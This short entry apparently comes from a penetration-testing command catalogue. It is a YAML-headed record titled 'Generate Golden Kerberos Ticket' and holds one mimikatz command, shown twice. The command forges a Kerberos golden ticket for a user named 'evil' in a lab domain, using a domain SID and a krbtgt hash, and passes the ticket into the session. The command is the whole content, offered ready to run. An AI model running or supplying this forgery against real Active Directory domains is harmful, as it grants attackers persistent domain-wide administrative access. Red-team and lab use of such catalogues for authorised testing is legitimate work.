---
id: a583b4b9-055a-45d4-89a2-4dbf624adf05
name: Generate Golden Kerberos Ticket
type: command
executor: bash
data: kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307
  /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
output: null
created_at: '2023-04-06T03:56:28.444691+00:00'
updated_at: '2023-04-10T20:37:25.781492+00:00'
---

# Generate Golden Kerberos Ticket

```bash
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
```
